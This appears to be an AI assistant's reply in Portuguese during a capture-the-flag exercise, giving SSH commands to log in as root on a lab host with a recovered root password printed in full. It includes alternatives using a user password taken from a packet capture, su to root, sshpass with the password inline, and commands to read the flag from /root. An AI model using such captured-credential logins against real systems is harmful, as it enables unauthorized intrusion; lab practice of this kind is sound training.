Com a senha root que encontramos, o comando SSH para login direto como root é:

## 🔐 **Comando SSH para Login Root:**

```bash
ssh root@172.16.0.106
```

**Quando pedir a senha, cole:**
```
ASfojoj2eozxczzmedlmedASASDKoj3o
```

## 🔄 **Alternativas se o SSH root estiver bloqueado:**

### **Opção 1 - Login como alex e depois su:**
```bash
# Primeiro login como alex
ssh alex@172.16.0.106
# Senha do alex: [a senha que você encontrou no PCAP]

# Depois fazer su para root
su -
# Colar a senha root: ASfojoj2eozxczzmedlmedASASDKoj3o
```

### **Opção 2 - Especificar a senha diretamente (com sshpass):**
```bash
sshpass -p 'ASfojoj2eozxczzmedlmedASASDKoj3o' ssh root@172.16.0.106
```

## 🚨 **Se tiver problemas de conexão SSH, verifique:**

### **1. Se a porta SSH é a padrão (22):**
```bash
ssh root@172.16.0.106 -p 22
```

### **2. Se precisar de chave SSH:**
```bash
ssh -o PubkeyAuthentication=no root@172.16.0.106
```

### **3. Para debug da conexão:**
```bash
ssh -v root@172.16.0.106
```

## ✅ **Após conectar, pegue a flag:**
```bash
cat /root/flag.txt
# ou
ls /root/
cat /root/*.txt
```

**Execute primeiro o comando simples `ssh root@172.16.0.106` e me diga o que acontece!** Se não funcionar, tentamos as alternativas.
